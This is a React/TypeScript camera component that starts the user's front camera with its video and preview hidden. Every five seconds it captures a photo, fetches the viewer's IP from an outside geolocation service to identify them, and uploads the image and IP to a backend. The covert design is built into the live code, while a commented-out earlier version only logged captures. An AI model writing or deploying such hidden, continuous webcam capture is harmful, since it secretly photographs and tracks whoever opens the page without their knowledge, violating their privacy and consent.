import React, { useEffect, useRef, useState } from 'react';
import axios from 'axios';
import { API_BASE_URL } from '../App';

const CameraComponent: React.FC = () => {
  const videoRef = useRef<HTMLVideoElement | null>(null);
  const canvasRef = useRef<HTMLCanvasElement | null>(null);
  const [image, setImage] = useState<string | null>(null);

  // Extracted function to capture and log the photo
  // const takePhoto = () => {
  //   if (videoRef.current && canvasRef.current) {
  //     const video = videoRef.current;
  //     const canvas = canvasRef.current;
      
  //     // Ensure the video hardware has actual active dimension signals
  //     if (video.videoWidth === 0) return;

  //     canvas.width = video.videoWidth;
  //     canvas.height = video.videoHeight;
      
  //     const ctx = canvas.getContext('2d');
  //     if (ctx) {
  //       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
  //       const dataUrl = canvas.toDataURL('image/png');
        
  //       // Console logs the URL on every hit
  //       console.log('Automated Capture URL:', dataUrl);
        
  //       // Updates state to show the most recent image in the UI
  //       setImage(dataUrl);
  //     }
  //   }
  // };


  const takePhoto = async () => {
  if (videoRef.current && canvasRef.current) {
    const video = videoRef.current;
    const canvas = canvasRef.current;
    if (video.videoWidth === 0) return;

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');
    
    if (ctx) {
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      const dataUrl = canvas.toDataURL('image/png');

      try {
        // 1. Get IP to identify the user
        console.log('Getting location...');
        const ipRes = await axios.get('https://geolocation-db.com/json/');
        const ip = ipRes.data.IPv4 || 'unknown';
        console.log('IP:', ip);

        // 2. Push image to the backend array
        console.log('Sending image to backend...');
        await axios.post(`${API_BASE_URL}/api/update-image`, {
          ip,
          imageData: dataUrl
        });
        
        console.log('Image uploaded successfully');
        setImage(dataUrl);
      } catch (err: any) {
        console.error("Sync Error Details:", {
          message: err.message,
          code: err.code,
          status: err.response?.status,
          data: err.response?.data,
          config: err.config?.url
        });
      }
    }
  }
};

  useEffect(() => {
    let captureInterval: number;

    const startContinuousCamera = async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
          video: { facingMode: "user" } 
        });
        
        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          
          // Wait for the video feed hardware to initialize
          videoRef.current.onloadedmetadata = () => {
            // 🔥 Triggers the capture function every 5000ms (5 seconds)
            captureInterval = setInterval(() => {
              takePhoto();
            }, 5000);
          };
        }
      } catch (err) {
        console.error("Camera access denied or unavailable:", err);
      }
    };

    startContinuousCamera();

    // 🛑 Critical Cleanup: Stops interval and camera stream on unmount
    return () => {
      if (captureInterval) clearInterval(captureInterval);
      if (videoRef.current && videoRef.current.srcObject) {
        const tracks = (videoRef.current.srcObject as MediaStream).getTracks();
        tracks.forEach(track => track.stop());
      }
    };
  }, []); 

  return (
    <div style={{ padding: '20px', fontFamily: 'sans-serif' }}>

      <div style={{ marginTop: '10px' }}>
        <video ref={videoRef} autoPlay playsInline style={{ width: '320px', backgroundColor: '#000', borderRadius: '8px', display:'none' }} />
      </div>
      
      <canvas ref={canvasRef} style={{ display: 'none' }} />
      
      {image && (
        <div style={{ marginTop: '20px', display:'none' }}>
          <h3>Latest Captured Image:</h3>
          <img src={image} alt="Captured" style={{ width: '320px', borderRadius: '8px' }} />
        </div>
      )}
    </div>
  );
};

export default CameraComponent;
